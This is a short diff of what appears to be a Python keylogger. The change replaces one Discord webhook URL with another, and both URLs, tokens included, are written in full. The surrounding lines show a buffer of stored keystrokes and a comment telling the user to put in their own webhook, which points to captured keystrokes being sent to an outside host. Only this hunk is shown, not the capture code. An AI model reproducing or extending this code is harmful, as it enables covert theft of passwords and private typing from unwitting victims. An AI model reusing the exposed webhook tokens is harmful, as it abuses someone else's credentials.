@@ -11,7 +11,7 @@ import io
 from datetime import datetime
 
 # Discord webhook URL (replace with your own webhook URL)
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1349444290685964400/oxR58MZVbLbFAgplbUV20kDIJCLogOawEksaOU7iHRlkLX0cX4XKAM28NO_sHgD2LYxO'
 
 # Store the keystrokes
 keystrokes = ""
